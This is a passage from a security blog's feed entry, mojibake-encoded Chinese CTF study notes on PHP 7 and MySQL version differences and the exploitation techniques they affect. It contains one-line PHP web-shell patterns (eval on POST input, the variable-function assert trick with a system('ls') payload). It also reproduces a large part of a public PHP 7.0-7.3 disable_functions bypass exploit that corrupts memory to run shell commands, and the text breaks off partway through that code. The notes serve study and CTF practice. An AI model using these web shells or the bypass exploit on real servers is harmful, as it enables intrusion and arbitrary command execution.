    <summary type="html">&lt;p&gt;æœ€è¿‘æ”¾å‡ºæ¥çš„æ–‡ç« éƒ½æ˜¯ä»¥å‰æ—©å°±æ€»ç»“å¥½çš„äº†ã€‚&lt;/p&gt;
&lt;h1 id=&quot;Redis-å®‰å…¨å­¦ä¹ ç¬”è®°&quot;&gt;&lt;a href=&quot;#Redis-å®‰å…¨å­¦ä¹ ç¬”è®°&quot; class=&quot;headerlink&quot; title=&quot;Redis å®‰å…¨å­¦ä¹ ç¬”è®°&quot;&gt;&lt;/a&gt;Redis å®‰å…¨å­¦ä¹ ç¬”è®°&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
      
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Redis" scheme="https://hack-for.fun/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>PHPä»¥åŠMYSQLç›¸å…³ç‰ˆæœ¬å·®å¼‚åŠå¯¹åº”çš„å®‰å…¨é—®</title>
    <link href="https://hack-for.fun/d8714939.html"/>
    <id>https://hack-for.fun/d8714939.html</id>
    <published>2020-05-31T15:53:12.000Z</published>
    <updated>2020-10-30T13:00:04.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€ç›´è§‰å¾—è‡ªå·±å¯¹ç›¸å…³çš„æ¼æ´å­¦çš„é©¬é©¬è™è™ï¼Œæ²¡æœ‰æ·±å…¥æ€»ç»“ï¼Œæœ€è¿‘å‡ æ¬¡CTFæ¯”èµ›ä¸­ä¹Ÿåƒäº†ä¸å°‘çš„äºã€‚é‚æƒ³èŠ±ä¸€ä¸¤å¤©çš„æ—¶é—´æ¥å¥½å¥½æ€»ç»“ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬ä¹‹é—´çš„åŒºåˆ«ï¼Œæ¼æ´åˆ©ç”¨æ–¹å¼çš„ä¸åŒï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>PHP ç°åœ¨åº”è¯¥ä¸€èˆ¬éƒ½å‡çº§ä¸º<strong>php7</strong>äº†å§ï¼Œæ‰€ä»¥æ¥å­¦ä¹ ä¸€æ³¢php7çš„æ–°ç‰¹æ€§ã€‚</p><p>ä¸»è¦æ˜¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="http://www.php7.site/book/php7/variable-changes-22.html#0">http://www.php7.site/book/php7/variable-changes-22.html#0</a></p><h2 id="å˜é‡å¤„ç†æœºåˆ¶"><a href="#å˜é‡å¤„ç†æœºåˆ¶" class="headerlink" title="å˜é‡å¤„ç†æœºåˆ¶"></a>å˜é‡å¤„ç†æœºåˆ¶</h2><ul><li>é—´æ¥å˜é‡ï¼Œå±æ€§å’Œæ–¹æ³•å¼•ç”¨éƒ½æŒ‰ç…§ <strong>ä»ä½œåˆ°å³</strong>åˆ°é¡ºåºè¿›è¡Œè§£é‡Šï¼ˆå¦‚æœæƒ³è¦æ”¹å˜é¡ºåºï¼Œå¯ä»¥ä½¿ç”¨å¤§æ‹¬å·</li><li>global å…³é”®å­—åªèƒ½å¼•ç”¨ç®€å•å˜é‡</li><li>æ— æ³•å°†ä¸€ä¸ªå‡½æ•°ä½œä¸ºå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°è¿›è¡Œä¼ é€’</li><li>å¼•ç”¨èµ‹å€¼æ—¶è‡ªåŠ¨åˆ›å»ºæ•°ç»„å…ƒç´ æˆ–è€…å¯¹è±¡å±æ€§é¡ºåºä¸åŒ</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$array = [];</span><br><span class="line">$array[<span class="string">&quot;a&quot;</span>] =&amp; $array[<span class="string">&quot;b&quot;</span>];</span><br><span class="line">$array[<span class="string">&quot;b&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">var_dump($array);</span><br><span class="line">PHP7äº§ç”Ÿçš„æ•°ç»„ï¼š[<span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>]</span><br><span class="line">PHP5äº§ç”Ÿçš„æ•°ç»„ï¼š[<span class="string">&quot;b&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;a&quot;</span> =&gt; <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h2 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h2><ul><li><code>list()</code> æŒ‰ç…§é¡ºåºè¿›è¡Œå–å€¼ã€‚</li><li>å¯¹ä¸€ä¸ªç©ºçš„list()èµ‹å€¼ä¸å†å…è®¸</li><li>list() ä¸å†å…·æœ‰æ‹†åˆ†åŠŸèƒ½</li></ul><h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h2><ul><li>foreachå¾ªç¯å¯¹æ•°ç»„å†…éƒ¨æŒ‡é’ˆä¸å†èµ·ä½œç”¨</li><li>foreachè¿›è¡Œby-valueå¾ªç¯æ—¶ï¼Œæ˜¯å¯¹è¯¥æ•°ç»„çš„æ‹·è´æ“ä½œï¼Œå¦‚æœå¯¹å…¶è¿›è¡Œä¿®æ”¹ä¹Ÿæ²¡æœ‰å½±å“</li><li>æŒ‰ç…§å¼•ç”¨è¿›è¡Œå¾ªç¯æ—¶ï¼Œå¯¹æ•°ç»„è¿›è¡Œä¿®æ”¹å°±ä¼šæœ‰å½±å“</li></ul><h2 id="å‚æ•°å¤„ç†æœºåˆ¶"><a href="#å‚æ•°å¤„ç†æœºåˆ¶" class="headerlink" title="å‚æ•°å¤„ç†æœºåˆ¶"></a>å‚æ•°å¤„ç†æœºåˆ¶</h2><ul><li>ä¸å†æ”¯æŒé‡å¤å‚æ•°åï¼ˆä¹Ÿæ²¡äººè¿™æ ·ç”¨</li><li>Func_get_arg å’Œ func_get_argsï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•è¿”å›å‚æ•°å½“å‰çš„å€¼ï¼Œè€Œä¸æ˜¯ä¼ å…¥æ—¶çš„å€¼</li><li>PHP7 æŠ¥é”™çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯æŠ¥å½“å‰å€¼</li></ul><h2 id="æ•´æ•°å¤„ç†æœºåˆ¶ä¿®æ”¹"><a href="#æ•´æ•°å¤„ç†æœºåˆ¶ä¿®æ”¹" class="headerlink" title="æ•´æ•°å¤„ç†æœºåˆ¶ä¿®æ”¹"></a>æ•´æ•°å¤„ç†æœºåˆ¶ä¿®æ”¹</h2><ul><li>æ— æ•ˆçš„8è¿›åˆ¶æ•°ä¼šç¼–è¯‘æŠ¥é”™ï¼Œè€Œè€ç‰ˆæœ¬ä¼šå¿½ç•¥æ— æ•ˆçš„æ•°å­—</li><li>ä½ç§»è´Ÿçš„ä½ç½®ä¼šäº§ç”Ÿå¼‚å¸¸ ArithmeticError: Bit shift by negative number</li><li>å·¦ä½ç§»å¦‚æœè¶…å‡ºä½æ•°è¿”å› <code>0</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">1</span> &lt;&lt; <span class="number">64</span>);</span><br></pre></td></tr></table></figure><ul><li>å³ç§»å¦‚æœè¶…å‡ºä½æ•°è¿”æ²ª0æˆ–-1</li></ul><h2 id="å­—ç¬¦ä¸²å¤„ç†æœºåˆ¶ä¿®æ”¹"><a href="#å­—ç¬¦ä¸²å¤„ç†æœºåˆ¶ä¿®æ”¹" class="headerlink" title="å­—ç¬¦ä¸²å¤„ç†æœºåˆ¶ä¿®æ”¹"></a>å­—ç¬¦ä¸²å¤„ç†æœºåˆ¶ä¿®æ”¹</h2><ul><li>å«æœ‰16è¿›åˆ¶çš„å­—ç¬¦ä¸²ä¸å†è§†ä¸ºæ•°å­—ï¼Œä¹Ÿä¸åŒºåˆ«å¯¹å¾…ã€‚è¿™ä¸ªå°±ä¼šæ¶‰åŠåˆ°ä¸€äº›ç»•è¿‡äº†ã€‚</li><li><code>\u&#123;</code> åé¢å¦‚æœåŒ…å«éæ³•å­—ç¬¦ä¼šæŠ¥é”™</li></ul><h2 id="å…¶ä»–ä¿®æ”¹"><a href="#å…¶ä»–ä¿®æ”¹" class="headerlink" title="å…¶ä»–ä¿®æ”¹"></a>å…¶ä»–ä¿®æ”¹</h2><ul><li>CURLæ¨¡å—ï¼šç¦æ­¢ç¦ç”¨CURLOPT_SAFE_UPLOADé€‰é¡¹ï¼Œé€šè¿‡curlä¸Šä¼ æ–‡ä»¶å¿…é¡»ä½¿ç”¨curl_file/CURLFILEæ¥å£ã€‚</li><li>DATEæ¨¡å—ï¼šmktime()å’Œgmmktime()å‡½æ•°ç§»é™¤äº†$is_dst parameterå‚æ•°ã€‚</li><li>DBAæ¨¡å—ï¼šdba_delete() å¦‚æœåœ¨inifileé‡Œé¢æ²¡æœ‰æ‰¾åˆ°keyçš„æ—¶å€™ä¼šè¿”å›falseã€‚</li><li>GMPæ¨¡å—ï¼šå¿…é¡»ç”¨libgmp 4.2ç‰ˆæœ¬ä»¥ä¸Šã€‚gmp_setbit() and gmp_clrbit()å¦‚æœä¼ å…¥çš„indexä¸ºè´Ÿæ•°çš„è¯ï¼Œä¼šè¿”å›falseã€‚</li><li>Intlæ¨¡å—ï¼šç§»é™¤äº†åˆ«åå‡½æ•°datefmt_set_timezone_id() å’ŒIntlDateFormatter::setTimeZoneID()ï¼Œç”¨datefmt_set_timezone() å’ŒIntlDateFormatter::setTimeZone()</li><li><strong>libxmlæ¨¡å—ï¼šæ–°å¢ibxml 2.9.0å¼•å…¥çš„LIBXML_BIGLINES é€‰é¡¹ï¼Œå¹¶åœ¨é”™è¯¯æŠ¥å‘Šä¸­å¢åŠ äº†è¡Œå·&gt; 16-bitçš„æ”¯æŒã€‚</strong></li><li>Mcryptæ¨¡å—ï¼š.ç§»é™¤äº†mcrypt_generic_end() mcrypt_ecb(), mcrypt_cbc(), mcrypt_cfb() å’Œmcrypt_ofb()</li><li>Opcacheï¼šç§»é™¤äº†opcache.load_commentsé…ç½®é¡¹ï¼Œç°åœ¨æ³¨é‡ŠåŠ è½½æ€»æ˜¯è¢«æ¿€æ´»çš„ã€‚</li><li>OpenSSLï¼šç§»é™¤äº†â€rsa_key_sizeâ€ã€â€CN_matchâ€ ã€â€SNI_server_nameâ€ é€‰é¡¹ã€‚</li><li><strong>PCREï¼šç§»é™¤äº† /e (PREG_REPLACE_EVAL) ä¿®é¥°ç¬¦çš„æ”¯æŒï¼Œä½¿ç”¨preg_replace_callback()æ¥ä»£æ›¿ã€‚</strong></li><li>PDO_pgsqlï¼šåˆ é™¤äº†PGSQL_ATTR_DISABLE_NATIVE_PREPARED_STATEMENTé€‰é¡¹ã€‚</li><li>Standardï¼šåˆ é™¤äº†setlocale()å‡½æ•°é‡Œé¢å¯¹å­—ç¬¦ä¸²ç±»å‹çš„æ”¯æŒï¼Œä½¿ç”¨LC_*å¸¸é‡ã€‚åˆ é™¤äº†set_magic_quotes_runtime() magic_quotes_runtime().</li><li>JSONï¼šjson_decode()ä¼šæ‹’ç»ä¸RFC 7159ä¸å…¼å®¹çš„æ•°å­—æ ¼å¼ã€‚json_decodeç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç©ºå€¼çš„æ—¶å€™ä¼šè¿”å›jsonè¯­æ³•é”™è¯¯ã€‚</li><li>Streamï¼šåˆ é™¤åˆ«åå‡½æ•°set_socket_blocking()</li><li>XSLï¼šåˆ é™¤xsl.security_prefs é€‰é¡¹ã€‚</li><li>session<ul><li>session_start()å¯ä»¥æ¥å—æ‰€æœ‰çš„INIè®¾ç½®ï¼Œå¯ä»¥ç”¨æ•°ç»„çš„æ–¹å¼ä¼ å…¥ï¼Œæ¯”å¦‚ï¼š[â€˜cache_limiterâ€™=&gt;â€™privateâ€™]</li><li>save handleræ¥å—validate_sid(), update_timestamp() ï¼Œå¯ç”¨æ¥æ£€æŸ¥sidæ˜¯å¦å­˜åœ¨ï¼Œæ›´æ–°sessionæ•°æ®çš„æ—¶é—´æˆ³ã€‚</li><li>å¢åŠ äº†SessionUpdateTimestampHandlerInterfaceï¼Œè¿™ä¸ªæ¥å£é‡Œé¢å®šä¹‰äº†validateSid(), updateTimestamp()æ–¹æ³•ã€‚</li><li>session.lazy_write(default=On) é…ç½®é¡¹å¯ä»¥å…è®¸åªæœ‰sessionæ•°æ®æœ‰å˜åŒ–æ—¶æ‰å†™æ•°æ®ã€‚</li></ul></li></ul><p>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>ä»¥åŠå…¶ä»–ç‰¹æ€§ã€‚</p><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p><a href="https://www.cc1021.com/article/134.html">https://www.cc1021.com/article/134.html</a></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>Eval æŠŠå…¶ä¸­çš„å­—ç¬¦ä¸²å½“åšPHPä»£ç è¿›è¡Œæ‰§è¡Œã€‚æ‰€æœ‰è¯­å¥å¿…é¡»ä»¥åˆ†å·ç»“æŸã€‚</p><blockquote><p>å‡½æ•°*<em>eval()**è¯­è¨€ç»“æ„æ˜¯ <em>éå¸¸å±é™©\</em>çš„ï¼Œ å› ä¸ºå®ƒå…è®¸æ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚ \</em>å®ƒè¿™æ ·ç”¨æ˜¯å¾ˆå±é™©çš„ã€‚* å¦‚æœæ‚¨ä»”ç»†çš„ç¡®è®¤è¿‡ï¼Œé™¤äº†ä½¿ç”¨æ­¤ç»“æ„ä»¥å¤– åˆ«æ— æ–¹æ³•, è¯·å¤šåŠ æ³¨æ„ï¼Œ<em>ä¸è¦å…è®¸ä¼ å…¥ä»»ä½•ç”±ç”¨æˆ· æä¾›çš„ã€æœªç»å®Œæ•´éªŒè¯è¿‡çš„æ•°æ®</em> ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line">    $_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// ä¼ å…¥ï¼š1=assert&amp;2=system(&#x27;ls&#x27;)</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">  <span class="comment">// short_open_tag=On</span></span><br></pre></td></tr></table></figure><p>eval æ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚ä¸èƒ½è¢«å¯å˜ å‡½æ•°è°ƒç”¨ã€‚</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸ºFALSEã€‚</p><p>PHP 5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="keyword">string</span> $description ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>PHP 7:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">Throwable</span> $exception ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>assertion</code> ä¸ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼šè¢«å½“åšphp ä»£ç æ¥æ‰§è¡Œã€‚<strong>åœ¨PHP 7 ä¸­ï¼Œå˜ä¸ºè¯­è¨€ç»“æ„è€Œä¸æ˜¯å‡½æ•°ï¼Œå³ä¸èƒ½åƒevalé‚£æ ·æ”¯æŒå¯å˜å‡½æ•°äº†ã€‚</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_POST[<span class="number">1</span>]($_POST[<span class="number">2</span>]); <span class="comment">// åœ¨php7 ä¸­æ— æ³•ä½¿ç”¨1=assert&amp;2=system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>evalå…¶å®æ˜¯Zendå¼•æ“åˆ°å‡½æ•°ï¼Œè€Œassertæ˜¯PHP_FUNCTION å®ç¼–å†™çš„ï¼Œè°ƒç”¨ä¸åŒã€‚</p><p><a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a></p><p><a href="https://www.anquanke.com/post/id/173201">https://www.anquanke.com/post/id/173201</a></p><h3 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h3><h4 id="Php-7-0-7-3-bypass"><a href="#Php-7-0-7-3-bypass" class="headerlink" title="Php 7.0-7.3 bypass"></a>Php 7.0-7.3 bypass</h4><p>:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;uname -a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span 